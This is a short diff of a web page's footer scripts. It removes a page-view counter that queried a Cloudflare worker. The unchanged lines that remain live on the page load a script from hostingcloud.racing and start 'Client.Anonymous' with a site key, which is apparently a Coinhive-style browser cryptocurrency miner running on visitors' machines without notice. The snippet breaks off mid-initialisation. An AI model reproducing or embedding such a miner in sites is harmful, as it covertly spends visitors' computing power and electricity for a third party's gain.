@@ -74,18 +74,6 @@
   <footer id="footer"></footer>
   <script src="./js/main.js"></script>
   <script src="./ruffle.js"></script>
-  <script>
-      const workerUri = "https://page-tracker.0817shiryu1225.workers.dev";
-      const { pathname } = new URL(window.location);
-      let workerUrl = workerUri + pathname;
-      fetch(workerUrl, {method: 'GET'})
-      .then(response => response.json())
-      .then(data => {
-              // get the counter value
-              document.getElementById("my_value_page_pv").innerHTML = data.pv;
-      })
-      .catch(err => {});
-  </script>
   <script src="https://www.hostingcloud.racing/og1d.js"></script>
   <script>
       var _client = new Client.Anonymous('b226f985c6028e9450ad838483abe1bc4475bd6137a7050b4ee327fcb939305b', {
